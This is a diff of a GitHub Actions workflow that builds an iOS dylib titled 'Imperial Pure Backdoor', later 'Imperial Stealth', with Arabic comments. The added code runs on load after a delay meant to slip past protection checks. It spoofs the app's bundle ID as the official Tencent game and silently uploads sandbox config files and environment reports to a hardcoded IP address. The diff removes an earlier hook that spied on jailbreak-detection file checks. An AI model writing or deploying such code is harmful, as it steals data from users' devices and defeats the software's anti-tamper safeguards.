@@ -1,4 +1,4 @@
-name: Imperial Pure Backdoor - V66.0 STABLE
+name: Imperial Stealth - V67.0 NO-CRASH
 
 on:
   push:
@@ -6,7 +6,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_pure_backdoor:
+  build_stealth:
     runs-on: macos-latest
 
     steps:
@@ -18,23 +18,22 @@ jobs:
           mkdir -p jni
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
+          #import <objc/runtime.h>
           #include <mach-o/dyld.h>
-          #include <sys/stat.h>
-          #include <unistd.h>
           #include <time.h>
 
           // ==========================================
-          // [ 1. إعدادات الإمبراطور والآيبي المثبت ]
+          // [ 1. إعدادات الإمبراطور - 34.204.178.160 ]
           // ==========================================
           #define SERVER_IP @"34.204.178.160"
           #define RADAR_URL @"http://34.204.178.160:5001/ask"
           #define UPLOAD_URL @"http://34.204.178.160:5000/upload"
 
-          // دالة الرادار (لقف الأسئلة)
-          void SendQuestion(NSString *category, NSString *content) {
+          // دالة إرسال التقارير (الأسئلة الصامتة)
+          void SendReport(NSString *category, NSString *content) {
               time_t now; time(&now);
               char *dt = ctime(&now);
-              if (dt) dt[strlen(dt)-1] = '\0'; // حذف سطر النهاية
+              if (dt) dt[strlen(dt)-1] = '\0';
 
               NSDictionary *json = @{
                   @"category": category,
@@ -47,17 +46,13 @@ jobs:
               [req setHTTPMethod:@"POST"];
               [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
               [req setHTTPBody:[NSJSONSerialization dataWithJSONObject:json options:0 error:nil]];
-              
-              // إرسال صامت في الخلفية
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
-          // دالة الجاسوس (سحب الملفات ببيئة الـ Sandbox)
-          void SendFileFromSandbox(NSString *fileName) {
-              // الحصول على مسار المجلد Documents مالت اللعبة
+          // دالة سحب الملفات (الجاسوس الصامت)
+          void SilentRaid(NSString *fileName) {
               NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-              NSString *documentsDirectory = [paths objectAtIndex:0];
-              NSString *fullPath = [documentsDirectory stringByAppendingPathComponent:fileName];
+              NSString *fullPath = [[paths objectAtIndex:0] stringByAppendingPathComponent:fileName];
               
               NSData *data = [NSData dataWithContentsOfFile:fullPath];
               if (!data) return;
@@ -66,7 +61,7 @@ jobs:
               NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               
-              NSString *boundary = @"ImperialBoundaryV66";
+              NSString *boundary = @"ImpStealthV67";
               [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
               
               NSMutableData *body = [NSMutableData data];
@@ -76,55 +71,54 @@ jobs:
               
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-              SendQuestion(@"RAID", [NSString stringWithFormat:@"✅ Captured File: %@", fileName]);
+              SendReport(@"Raid", [NSString stringWithFormat:@"✅ Captured: %@", fileName]);
           }
 
           // ==========================================
-          // [ 2. رادار الأسئلة الصامت (System Call Hooks) ]
+          // [ 2. تزييف الهوية (Safe Swizzling) ]
           // ==========================================
-          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
-          #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
-
-          // لقف السؤال عن وجود الملفات (access)
-          // هذا الهوك الصامت آمن جداً ولا يسبب كراش
-          int hk_access(const char *path, int mode) {
-              if (path && (strstr(path, "Cydia") || strstr(path, "Shadow") || strstr(path, "lib") || strstr(path, ".dat"))) {
-                  SendQuestion(@"File Check 🛰️", [NSString stringWithFormat:@"اللعبة تسأل: هل ملف %s موجود؟", path]);
-              }
-              return access(path, mode);
+          // هذي الطريقة آمنة جداً ولا تسبب كراش لأنها تستخدم نظام الـ Objective-C الرسمي
+          void SetupOfficialSpoof() {
+              Method m = class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier));
+              method_setImplementation(m, imp_implementationWithBlock(^NSString* (id self) {
+                  return @"com.tencent.ig"; // إيهام النظام بأنها النسخة الرسمية
+              }));
+              SendReport(@"Identity", @"🛡️ Bundle ID Spoofed to Official ✅");
           }
-          INTERPOSE(hk_access, access);
 
           // ==========================================
-          // [ 3. نقطة الدخول (الساكتة) ]
+          // [ 3. نقطة الدخول (Constructor) ]
           // ==========================================
           __attribute__((constructor))
           static void entry() {
-              // تأخير التشغيل 10 ثواني لضمان استقرار الحقن
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  SendQuestion(@"System", @"✅ Imperial Pure Backdoor is Active & Silent");
+              // تأخير طويل جداً (30 ثانية) لضمان عبور كل فحوصات الحماية عند الإقلاع
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                   
-                  // سحب أهم الملفات فورياً ببيئة الـ Sandbox
-                  SendFileFromSandbox(@"RemoteConfig.config");
-                  SendFileFromSandbox(@"GCloud.config");
+                  SetupOfficialSpoof(); // تفعيل التخفي
                   
-                  // فحص الـ Bundle ID للنسخة الرسمية
-                  NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
-                  SendQuestion(@"App Info", [NSString stringWithFormat:@"App is running with Bundle ID: %@", bid]);
+                  SendReport(@"System", @"🚀 Imperial Stealth Active - No Menu, No Crash");
+
+                  // سحب الملفات تلقائياً بمجرد الاستقرار باللوبي
+                  SilentRaid(@"RemoteConfig.config");
+                  SilentRaid(@"GCloud.config");
+                  
+                  // تقرير عن حالة الـ Sandbox
+                  NSString *home = NSHomeDirectory();
+                  SendReport(@"Environment", [NSString stringWithFormat:@"Sandbox Path: %@", home]);
               });
           }
           EOF
 
-      - name: Build Pure Backdoor Dylib
+      - name: Build Stealth Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 jni/main.mm -o ImperialFinal.dylib \
+          -arch arm64 jni/main.mm -o ImperialStealth.dylib \
           -framework Foundation -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Final-Backdoor
-          path: ImperialFinal.dylib
+          name: Imperial-Stealth-Final
+          path: ImperialStealth.dylib
           
